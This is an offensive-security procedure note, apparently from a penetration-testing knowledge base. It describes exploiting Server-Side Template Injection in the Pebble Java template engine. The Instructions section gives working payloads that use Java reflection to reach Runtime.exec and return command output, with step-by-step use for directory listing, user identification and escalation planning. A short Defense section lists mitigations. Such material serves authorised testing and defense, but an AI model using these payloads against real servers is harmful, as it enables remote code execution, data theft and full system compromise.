---
type: procedure
tactics:
  - '[[Execution]]'
techniques:
  - '[[Template Injection]]'
sub_techniques: []
tags:
  - Pebble
  - Pebble-Code-Execution
  - Server-Side-Template-Injection
  - SSTI
commands: []
platforms:
  - Web
  - Java
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Pebble-Server-Side-Template-Injection-Code-Execution

## Summary

This procedure exploits Server-Side Template Injection (SSTI) vulnerabilities in the Pebble Java-based template engine to execute arbitrary operating system commands on the server. By injecting malicious template expressions, attackers can leverage Java reflection to invoke the Runtime.exec() method, enabling reconnaissance commands like listing directories or retrieving user information, which can lead to further compromise such as data exfiltration or privilege escalation.

## Description

Pebble is a templating engine for Java applications, often used in web frameworks to render dynamic content. SSTI occurs when user input is unsafely interpolated into templates without proper sanitization, allowing attackers to inject expressions that execute code. This procedure focuses on exploiting such vulnerabilities in user-controlled template inputs, such as search fields, user profiles, or error messages in web applications. The attack uses Java's Runtime class via reflection to execute shell commands, bypassing typical input validation. Prerequisites include identifying a vulnerable endpoint through testing common injection points with payloads like '{{7*7}}' to confirm SSTI (expecting '49' in output). Successful exploitation grants command execution in the context of the web application server process, typically running as a low-privilege user, but can reveal paths for lateral movement.

## Requirements

1. Access to a web application endpoint that processes user input through the Pebble template engine without sanitization.
2. Knowledge of the application's structure to identify injectable parameters (e.g., via Burp Suite or manual testing).
3. A proxy tool like Burp Suite to intercept and modify requests for payload delivery.
4. Basic understanding of Java reflection and shell commands for the target OS (Linux/Unix assumed here).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for all template variables, using Pebble's safe evaluation modes or whitelisting allowed expressions.
- Employ Web Application Firewalls (WAFs) to detect and block common SSTI patterns, such as '{{', '%}', or Java class invocations.
- Run web applications in sandboxed environments with minimal permissions, using containers or SELinux to limit command execution impact.
- Monitor application logs for anomalous template rendering errors, unexpected command outputs, or Java reflection calls; enable verbose logging in Pebble.
- Regularly audit dependencies for known vulnerabilities and apply patches; use static analysis tools to scan for unsafe template usage.

## Objectives

1. Execute arbitrary commands on the server to perform reconnaissance, such as listing files or identifying the current user.
2. Gather sensitive system information to identify escalation paths or data locations.
3. Escalate privileges by chaining with other vulnerabilities or misconfigurations discovered via initial commands.
4. Achieve remote code execution (RCE) leading to full system compromise if combined with privilege escalation techniques.

## Instructions

### Step 1: Identify and Test Vulnerable Endpoint

**Context**: Locate an input field or parameter that renders user-supplied data via Pebble templates. Test for SSTI by injecting a simple expression to confirm execution.

Inject a test payload like '{{7*7}}' into the vulnerable parameter and submit the request. If the response contains '49', SSTI is confirmed, indicating the engine evaluates expressions.

> This step verifies the vulnerability without executing dangerous code, allowing safe progression to command injection.

### Step 2: Inject Payload to List Files and Directories

**Context**: Use a Pebble SSTI payload to execute a directory listing command, revealing the server's file structure and potential sensitive files for further exploitation.

**Code** ([[codes/Pebble-SSTI-List-Files-Directories]]):

```text
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('$_COMMAND') }}
```

> Replace '$_COMMAND' with 'ls -la' to list the current directory in long format. Submit the payload via the vulnerable endpoint (e.g., in a GET/POST parameter). The response will include the command output if successful, showing file permissions, ownership, sizes, and modification dates. This helps identify configuration files, logs, or writable directories. On non-Linux systems, adjust to 'dir' for Windows.

### Step 3: Inject Payload to Retrieve Current User ID

**Context**: Execute a command to identify the running user context, which informs privilege levels and potential escalation vectors (e.g., if running as root or a service account).

**Code** ([[codes/Pebble-SSTI-Get-Current-User-ID]]):

```text
{% set cmd = '$_COMMAND' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

> Set '$_COMMAND' to 'id' to retrieve user and group IDs. Submit the payload; the response will display output like 'uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)'. This reveals the process owner, aiding in targeting sudo-enabled users or SUID binaries for escalation. The payload reads the process output as bytes and converts to a string for rendering.
